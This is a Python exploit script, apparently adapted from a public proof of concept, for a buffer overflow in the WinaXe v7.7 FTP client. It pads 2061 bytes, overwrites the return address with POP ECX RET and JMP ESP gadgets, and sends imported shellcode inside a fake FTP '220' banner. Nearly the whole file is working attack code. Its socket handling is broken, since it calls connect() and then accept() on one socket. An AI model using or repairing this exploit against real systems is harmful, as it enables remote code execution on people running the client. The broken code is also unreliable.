
import socket
import struct
from struct import pack
from payload import buf
def shell_attack(target_machine, target_port):

#WinaXe v7.7 FTP Client 'Service Ready' Command Buffer Overflow Exploit
#Discovery hyp3rlinx
#ISR: ApparitionSec
#hyp3rlinx.altervista.org


#shellcode to pop calc.exe Windows 7 SP1



    eip=struct.pack(b'<L',0x68084A6F)    #POP ECX RET 
    jmpesp=struct.pack(b'<L',0x68017296) #JMP ESP

    #We will do POP ECX RET and place a JMP ESP address at the RET address that will jump to shellcode.

    payload=b"A"*2061+eip+jmpesp+b"\x90"*10+buf+b"\x90"*20     #Server Ready '220' Exploit

    port = target_port                  
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    host = target_machine   
    # connect to the socket 
    s.connect((host, port)) 
    
              
    


    while True:
        conn, addr = s.accept()     
        conn.send(b'220'+payload+b'\r\n')
        conn.close()





